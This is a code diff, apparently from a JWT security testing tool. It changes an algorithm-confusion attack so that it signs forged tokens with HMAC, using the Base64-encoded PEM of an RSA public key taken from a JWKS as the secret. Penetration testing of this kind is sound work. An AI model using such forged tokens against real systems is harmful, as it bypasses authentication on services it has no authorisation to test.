@@ -112,13 +112,14 @@ async function generateJwkAttackToken(forceJwkSign) {
         if (rsaKey.kid) nextHeader.kid = rsaKey.kid;
 
         const pem = await jwkRsaPublicToPem(rsaKey);
+        const base64PemSecret = btoa(pem);
         const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
-        nextSig = await hmacSignBase64url(signingInput, pem, hashFromAlg(nextHeader.alg));
+        nextSig = await hmacSignBase64url(signingInput, base64PemSecret, hashFromAlg(nextHeader.alg));
         resultToken.value = `${signingInput}.${nextSig}`;
         attackNotes.textContent = [
           `Algorithm confusion candidate generated (${direction}).`,
           `Header alg switched to ${nextHeader.alg}.`,
-          'HMAC secret was built automatically from RSA public key in provided JWKS.',
+          'HMAC secret was built as Base64-encoded PEM extracted from RSA public key in provided JWKS.',
         ].join('\n');
         return;
       }
